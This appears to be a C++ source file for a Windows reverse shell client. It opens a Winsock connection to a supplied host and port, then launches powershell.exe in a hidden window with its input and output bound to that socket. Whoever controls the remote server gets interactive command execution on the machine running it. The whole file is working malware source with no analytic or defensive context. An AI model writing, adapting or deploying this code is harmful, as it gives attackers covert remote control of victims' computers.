#ifndef CLIENT_HPP
#define CLIENT_HPP

#include "client.cpp"

Client::Client(const char* chost, unsigned short int cport) {
  server = chost;
  port = cport;
  // create socket
  printf("creating socket");
  WSAStartup(MAKEWORD(2, 2), &wsaData);
  socket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
}

void Client::connect_socket() {
  // declare connect type, host, port
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(server);
  addr.sin_port = htons(port);

  // now connect
  //try {
  WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
  //} catch (err) {
  //	closesocket(socket);
  //	WSACleanup();
  //}
}

bool Client::check_connection() {
  // check if there is any connection at all
  memset(rdata, 0, sizeof(rdata));
  int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);
  if (RecvCode <= 0) {
    closesocket(socket);
    WSACleanup();
    return false;
  }
  else {
    return true;
  }
}

void Client::receive_commands() {
  memset(rdata, 0, sizeof(rdata));
  int RecvCode = recv(socket, rdata, BUFFER_SIZE, 0);
  if (RecvCode <= 0) {
    closesocket(socket);
    WSACleanup();
  }
  if (strcmp(rdata, "exit\n") == 0) {
    exit(0);
  }
}

int Client::start_shell() {
  STARTUPINFO sinfo = { 0 };
  PROCESS_INFORMATION pinfo;
  char Process[] = "powershell.exe";

  memset(&sinfo, 0, sizeof(sinfo));
  sinfo.cb = sizeof(sinfo);
  // window configuration
  sinfo.wShowWindow = SW_HIDE;
  sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
  // all below are equal to socket
  sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;

  // starting powershell
  CreateProcess(NULL, (LPSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&sinfo, &pinfo);
  // the errors above will only show for vs, use mingw thats what i did because my vs gives runtimes errors
  WaitForSingleObject(pinfo.hProcess, INFINITE);
  CloseHandle(pinfo.hProcess);
  CloseHandle(pinfo.hThread);
  return 0;
}

#endif //CLIENT_HPP
